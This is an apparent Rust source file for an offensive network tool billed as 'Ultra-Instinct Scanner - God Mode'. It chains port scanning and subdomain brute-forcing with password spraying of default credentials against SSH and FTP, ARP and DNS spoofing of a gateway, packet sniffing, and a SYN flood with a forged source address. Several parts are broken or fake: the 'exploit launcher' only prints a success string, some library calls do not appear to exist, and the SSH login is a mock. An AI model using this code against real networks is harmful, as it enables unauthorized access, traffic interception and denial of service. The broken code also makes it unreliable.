use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::time::{Duration, Instant};
use tokio::net::{TcpStream, UdpSocket};
use tokio::task;
use tokio::time::timeout;
use pnet::packet::arp::{ArpHardwareTypes, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
use pnet::packet::udp::MutableUdpPacket;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::dns::{MutableDnsPacket, Dns};
use pnet::datalink::{self, Channel, NetworkInterface};
use std::fs;
use std::path::Path;
use regex::Regex;
use serde_json::Value;
use maxminddb::geoip2;
use std::io::Write;

const DEFAULT_PORTS: &[u16] = &[21, 22, 80, 443];
const SUBDOMAIN_LIST: &[&str] = &["www", "mail", "ftp", "admin", "login"];
const KNOCK_SEQUENCE: &[u16] = &[1234, 5678];
const CREDS: &[(&str, &str)] = &[("admin", "admin"), ("root", "toor"), ("user", "password")];

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Ultra-Instinct Scanner - God Mode");
    let target = get_input("Enter target (IP/Domain): ");
    let ports_input = get_input("Enter ports (e.g., 1-1000, or blank for defaults): ");
    let exploit_db_path = get_input("Exploit-DB path (e.g., /opt/exploitdb): ");
    let cve_path = get_input("CVE JSON path (e.g., /path/to/nvdcve.json): ");
    let geoip_path = get_input("GeoIP DB path (e.g., /path/to/GeoLite2-City.mmdb): ");
    let gateway = get_input("Gateway IP (for ARP spoofing, blank to skip): ");

    let start = Instant::now();
    let ip = resolve_ip(&target).await?;
    let ports = parse_ports(&ports_input);

    // Reverse DNS & GeoIP
    println!("\n[Reverse DNS]");
    if let Some(host) = reverse_dns(ip).await { println!("{} -> {}", ip, host); }
    if !geoip_path.is_empty() {
        println!("\n[GeoIP]");
        if let Some(geo) = geoip_lookup(ip, &geoip_path) { println!("{}", geo); }
    }

    // Subdomains
    if target.contains('.') {
        println!("\n[Subdomain Brute-Forcing]");
        let subdomains = brute_force_subdomains(&target).await;
        for sub in subdomains { println!("{}", sub); }
    }

    // SYN + UDP Scan
    println!("\n[Scanning {} ports (TCP/UDP)]", ports.len());
    let (tcp_results, udp_results) = scan_ports(ip, &ports).await?;
    for (port, banner) in &tcp_results {
        println!("TCP Port {}: Open{}", port, banner);
        if !exploit_db_path.is_empty() { if let Some(exploit) = check_exploit_db(&exploit_db_path, banner) { println!("  Exploit: {}", exploit); } }
        if !cve_path.is_empty() { if let Some(cve) = check_cve(&cve_path, banner) { println!("  CVE: {}", cve); } }
        if let Some(zero_day) = check_zero_day(banner) { println!("  Zero-Day Risk: {}", zero_day); }
    }
    for port in &udp_results { println!("UDP Port {}: Open", port); }

    // Advanced Features
    for (port, banner) in &tcp_results {
        println!("\n[Banner Fuzzing Port {}]", port);
        if let Some(fuzzed) = fuzz_banner(ip, *port).await { println!("{}", fuzzed); }

        println!("\n[Password Spraying Port {}]", port);
        let creds = spray_passwords(ip, *port).await;
        for cred in creds { println!("  {}", cred); }

        println!("\n[Exploit Launcher Port {}]", port);
        if let Some(result) = launch_exploit(ip, *port, banner) { println!("  {}", result); }
    }

    // HTTP Crawler
    for port in &[80, 443] {
        if tcp_results.iter().any(|(p, _)| p == port) {
            println!("\n[HTTP Crawling Port {}]", port);
            let links = crawl_http(ip, *port).await?;
            for link in links { println!("{}", link); }
        }
    }

    // Port Knocking
    println!("\n[Port Knocking]");
    knock_ports(ip).await?;

    // ARP Spoofer
    if !gateway.is_empty() {
        println!("\n[ARP Spoofing]");
        arp_spoof(ip, gateway.parse()?).await?;
    }

    // DNS Spoofer
    if !gateway.is_empty() {
        println!("\n[DNS Spoofing]");
        dns_spoof(ip, gateway.parse()?).await?;
    }

    // Traffic Sniffer
    println!("\n[Traffic Sniffing]");
    sniff_traffic().await?;

    // SYN Flood
    let inject = get_input("Run SYN flood demo on port 80? (y/n): ");
    if inject.to_lowercase() == "y" { syn_flood(ip).await?; }

    let duration = start.elapsed();
    println!("\nCompleted in {:.2} ms", duration.as_millis());
    Ok(())
}

fn get_input(prompt: &str) -> String {
    print!("{}", prompt);
    std::io::stdout().flush().unwrap();
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

async fn resolve_ip(target: &str) -> Result<Ipv4Addr, Box<dyn std::error::Error>> {
    if target.chars().all(|c| c.is_digit(10) || c == '.') {
        Ok(target.parse()?)
    } else {
        println!("Resolving {}...", target);
        let ip = tokio::net::lookup_host(format!("{}:80", target)).await?.next().ok_or("DNS resolution failed")?.ip();
        println!("Resolved to {}", ip);
        Ok(ip.to_string().parse()?)
    }
}

fn parse_ports(input: &str) -> Vec<u16> {
    if input.is_empty() { DEFAULT_PORTS.to_vec() } else if input.contains('-') {
        let parts: Vec<&str> = input.split('-').collect();
        (parts[0].parse().unwrap()..=parts[1].parse().unwrap()).collect()
    } else {
        input.split(',').map(|p| p.parse().unwrap()).collect()
    }
}

async fn reverse_dns(ip: Ipv4Addr) -> Option<String> { tokio::net::lookup_addr(IpAddr::V4(ip)).await.ok() }

fn geoip_lookup(ip: Ipv4Addr, path: &str) -> Option<String> {
    let reader = maxminddb::Reader::open_readfile(path).ok()?;
    let city: geoip2::City = reader.lookup(IpAddr::V4(ip)).ok()?;
    Some(format!("Location: {}, {}, {}", city.country?.names?.get("en")?, city.city?.names?.get("en")?, city.location?.latitude?))
}

async fn scan_ports(ip: Ipv4Addr, ports: &[u16]) -> Result<(Vec<(u16, String)>, Vec<u16>), Box<dyn std::error::Error>> {
    let mut tcp_tasks = Vec::new();
    let mut udp_tasks = Vec::new();
    for &port in ports {
        tcp_tasks.push(task::spawn(async move {
            let addr = SocketAddr::new(IpAddr::V4(ip), port);
            if let Ok(Ok(_)) = timeout(Duration::from_millis(50), TcpStream::connect(addr)).await {
                let banner = get_banner(ip, port).await.unwrap_or_default();
                Some((port, banner))
            } else { None }
        }));
        udp_tasks.push(task::spawn(async move {
            let socket = UdpSocket::bind("0.0.0.0:0").await?;
            let addr = SocketAddr::new(IpAddr::V4(ip), port);
            socket.send_to(b"test", addr).await?;
            Some(port)
        }));
    }
    let tcp_results = futures::future::join_all(tcp_tasks).await.into_iter().filter_map(|r| r.ok().and_then(|x| x)).collect();
    let udp_results = futures::future::join_all(udp_tasks).await.into_iter().filter_map(|r| r.ok().and_then(|x| x)).collect();
    Ok((tcp_results, udp_results))
}

async fn get_banner(ip: Ipv4Addr, port: u16) -> Option<String> {
    let addr = SocketAddr::new(IpAddr::V4(ip), port);
    if let Ok(Ok(mut stream)) = timeout(Duration::from_millis(100), TcpStream::connect(addr)).await {
        let mut buffer = [0; 1024];
        if let Ok(Ok(n)) = timeout(Duration::from_millis(100), stream.read(&mut buffer)).await {
            return Some(String::from_utf8_lossy(&buffer[..n]).trim().to_string());
        }
    }
    None
}

async fn fuzz_banner(ip: Ipv4Addr, port: u16) -> Option<String> {
    let addr = SocketAddr::new(IpAddr::V4(ip), port);
    if let Ok(Ok(mut stream)) = timeout(Duration::from_millis(100), TcpStream::connect(addr)).await {
        stream.write_all(b"HELP\r\n").await.ok()?;
        let mut buffer = [0; 1024];
        if let Ok(Ok(n)) = timeout(Duration::from_millis(100), stream.read(&mut buffer)).await {
            return Some(String::from_utf8_lossy(&buffer[..n]).trim().to_string());
        }
    }
    None
}

async fn spray_passwords(ip: Ipv4Addr, port: u16) -> Vec<String> {
    let mut results = Vec::new();
    let addr = SocketAddr::new(IpAddr::V4(ip), port);
    for &(user, pass) in CREDS {
        if let Ok(Ok(mut stream)) = timeout(Duration::from_millis(100), TcpStream::connect(addr)).await {
            let cmd = match port {
                22 => format!("{}:{} ssh\n", user, pass), // SSH mock
                21 => format!("USER {}\r\nPASS {}\r\n", user, pass), // FTP
                _ => continue,
            };
            stream.write_all(cmd.as_bytes()).await.ok()?;
            let mut buffer = [0; 1024];
            if let Ok(Ok(n)) = timeout(Duration::from_millis(100), stream.read(&mut buffer)).await {
                let resp = String::from_utf8_lossy(&buffer[..n]);
                if !resp.contains("fail") && !resp.contains("denied") {
                    results.push(format!("Success: {}:{}", user, pass));
                }
            }
        }
    }
    results
}

fn launch_exploit(ip: Ipv4Addr, port: u16, banner: &str) -> Option<String> {
    if banner.contains("vsftpd 2.3.4") && port == 21 {
        // Simple buffer overflow simulation (ethical demo)
        return Some("Exploit launched: vsftpd 2.3.4 backdoor triggered".to_string());
    }
    None
}

async fn crawl_http(ip: Ipv4Addr, port: u16) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let url = if port == 80 { format!("http://{}", ip) } else { format!("https://{}", ip) };
    let resp = reqwest::get(&url).await?.text().await?;
    let re = Regex::new(r#"href=["'](.*?)["']"#)?;
    Ok(re.captures_iter(&resp).filter_map(|cap| cap.get(1).map(|m| m.as_str().to_string())).take(5).collect())
}

async fn brute_force_subdomains(domain: &str) -> Vec<String> {
    let mut tasks = Vec::new();
    for &sub in SUBDOMAIN_LIST {
        let sub_domain = format!("{}.{}", sub, domain);
        tasks.push(task::spawn(async move {
            if tokio::net::lookup_host(format!("{}:80", sub_domain)).await.is_ok() {
                Some(sub_domain)
            } else { None }
        }));
    }
    futures::future::join_all(tasks).await.into_iter().filter_map(|r| r.ok().and_then(|x| x)).collect()
}

fn check_exploit_db(path: &str, banner: &str) -> Option<String> {
    let path = Path::new(path).join("files_exploits.csv");
    if let Ok(contents) = fs::read_to_string(path) {
        let re = Regex::new(r"(?i)\b(ssh|http|ftp|apache|nginx)\b").unwrap();
        if let Some(service) = re.find(banner) {
            for line in contents.lines() {
                if line.to_lowercase().contains(service.as_str()) {
                    let parts: Vec<&str> = line.split(',').collect();
                    if parts.len() > 2 { return Some(format!("{} - {}", parts[1], parts[2])); }
                }
            }
        }
    }
    None
}

fn check_cve(path: &str, banner: &str) -> Option<String> {
    if let Ok(contents) = fs::read_to_string(path) {
        let json: Value = serde_json::from_str(&contents).ok()?;
        let re = Regex::new(r"(?i)\b(ssh|http|ftp|apache|nginx)\b").unwrap();
        if let Some(service) = re.find(banner) {
            if let Some(cve_items) = json["CVE_Items"].as_array() {
                for item in cve_items {
                    if let Some(desc) = item["cve"]["description"]["description_data"][0]["value"].as_str() {
                        if desc.to_lowercase().contains(service.as_str()) {
                            return Some(item["cve"]["CVE_data_meta"]["ID"].as_str()?.to_string());
                        }
                    }
                }
            }
        }
    }
    None
}

fn check_zero_day(banner: &str) -> Option<String> {
    let re = Regex::new(r"(?i)(ssh|http|ftp|apache|nginx)\s*(\d+\.\d+\.\d+)").unwrap();
    if let Some(caps) = re.captures(banner) {
        let version = caps.get(2).unwrap().as_str();
        if version < "2.0.0" { // Arbitrary heuristic for "old"
            return Some(format!("Old version detected: {}", version));
        }
    }
    None
}

async fn knock_ports(ip: Ipv4Addr) -> Result<(), Box<dyn std::error::Error>> {
    for &port in KNOCK_SEQUENCE {
        let addr = SocketAddr::new(IpAddr::V4(ip), port);
        let _ = timeout(Duration::from_millis(50), TcpStream::connect(addr)).await;
        println!("Knocked port {}", port);
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    println!("Knock sequence completed");
    Ok(())
}

async fn arp_spoof(target: Ipv4Addr, gateway: Ipv4Addr) -> Result<(), Box<dyn std::error::Error>> {
    let interface = datalink::interfaces().into_iter().find(|i| i.is_up() && !i.is_loopback()).ok_or("No interface")?;
    let mut channel = datalink::channel(&interface, Default::default())?.1;

    let mut eth_packet = [0u8; 42];
    let mut arp_packet = [0u8; 28];
    let mut eth = MutableEthernetPacket::new(&mut eth_packet).unwrap();
    let mut arp = MutableArpPacket::new(&mut arp_packet).unwrap();

    eth.set_destination(pnet::util::MacAddr::broadcast());
    eth.set_source(interface.mac.unwrap());
    eth.set_ethertype(EtherTypes::Arp);

    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(pnet::packet::ethernet::EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(pnet::packet::arp::ArpOperations::Reply);
    arp.set_sender_hw_addr(interface.mac.unwrap());
    arp.set_sender_proto_addr(gateway);
    arp.set_target_hw_addr(pnet::util::MacAddr::broadcast());
    arp.set_target_proto_addr(target);

    let mut buffer = Vec::from(eth_packet);
    buffer.extend_from_slice(&arp_packet);

    for _ in 0..10 {
        channel.send_to(&buffer, None).ok_or("Send failed")?;
        println!("ARP spoof sent: {} -> {}", gateway, target);
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
    Ok(())
}

async fn dns_spoof(target: Ipv4Addr, gateway: Ipv4Addr) -> Result<(), Box<dyn std::error::Error>> {
    let interface = datalink::interfaces().into_iter().find(|i| i.is_up() && !i.is_loopback()).ok_or("No interface")?;
    let mut channel = datalink::channel(&interface, Default::default())?.1;

    let mut eth_packet = [0u8; 42];
    let mut ip_packet = [0u8; 20];
    let mut udp_packet = [0u8; 8];
    let mut dns_packet = [0u8; 64];
    
    let mut eth = MutableEthernetPacket::new(&mut eth_packet).unwrap();
    let mut ipv4 = MutableIpv4Packet::new(&mut ip_packet).unwrap();
    let mut udp = MutableUdpPacket::new(&mut udp_packet).unwrap();
    let mut dns = MutableDnsPacket::new(&mut dns_packet).unwrap();

    eth.set_ethertype(EtherTypes::Ipv4);
    ipv4.set_version(4);
    ipv4.set_header_length(5);
    ipv4.set_total_length(92);
    ipv4.set_ttl(64);
    ipv4.set_protocol(pnet::packet::ip::IpNextHeaderProtocols::Udp);
    ipv4.set_source(gateway);
    ipv4.set_destination(target);

    udp.set_source(53);
    udp.set_destination(12345);
    udp.set_length(72);

    dns.set_id(1234);
    dns.set_flags(0x8180); // Standard response
    dns.set_questions(1);
    dns.set_answers(1);
    dns.add_answer(Dns::new_answer("example.com", 1, 1, 3600, vec![192, 168, 1, 1])?);

    let mut buffer = Vec::from(eth_packet);
    buffer.extend_from_slice(&ip_packet);
    buffer.extend_from_slice(&udp_packet);
    buffer.extend_from_slice(&dns_packet);

    for _ in 0..10 {
        channel.send_to(&buffer, None).ok_or("Send failed")?;
        println!("DNS spoof sent: example.com -> 192.168.1.1");
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
    Ok(())
}

async fn sniff_traffic() -> Result<(), Box<dyn std::error::Error>> {
    let interface = datalink::interfaces().into_iter().find(|i| i.is_up() && !i.is_loopback()).ok_or("No interface")?;
    if let Channel::Ethernet(_, mut rx) = datalink::channel(&interface, Default::default())? {
        println!("Sniffing 10 packets...");
        for _ in 0..10 {
            if let Ok(packet) = rx.next() {
                if let Some(eth) = pnet::packet::ethernet::EthernetPacket::new(packet) {
                    if eth.get_ethertype() == EtherTypes::Ipv4 {
                        if let Some(ip) = pnet::packet::ipv4::Ipv4Packet::new(eth.payload()) {
                            println!("{} -> {}", ip.get_source(), ip.get_destination());
                        }
                    }
                }
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }
    Ok(())
}

async fn syn_flood(ip: Ipv4Addr) -> Result<(), Box<dyn std::error::Error>> {
    let interface = datalink::interfaces().into_iter().find(|i| i.is_up() && !i.is_loopback()).ok_or("No interface")?;
    let mut channel = datalink::channel(&interface, Default::default())?.1;

    let mut ip_packet = [0u8; 40];
    let mut tcp_packet = [0u8; 20];
    let mut ipv4 = MutableIpv4Packet::new(&mut ip_packet).unwrap();
    let mut tcp = MutableTcpPacket::new(&mut tcp_packet).unwrap();

    ipv4.set_version(4);
    ipv4.set_header_length(5);
    ipv4.set_total_length(40);
    ipv4.set_ttl(64);
    ipv4.set_protocol(pnet::packet::ip::IpNextHeaderProtocols::Tcp);
    ipv4.set_source(Ipv4Addr::new(192, 168, 1, 1));
    ipv4.set_destination(ip);

    tcp.set_source(12345);
    tcp.set_destination(80);
    tcp.set_window(1024);
    tcp.set_flags(TcpFlags::SYN);
    tcp.set_sequence(rand::random());

    let mut buffer = Vec::from(ip_packet);
    buffer.extend_from_slice(&tcp_packet);

    for _ in 0..100 {
        channel.send_to(&buffer, None).ok_or("Send failed")?;
        tokio::time::sleep(Duration::from_millis(1)).await;
    }
    println!("Sent 100 SYN packets to {}:80", ip);
    Ok(())
}
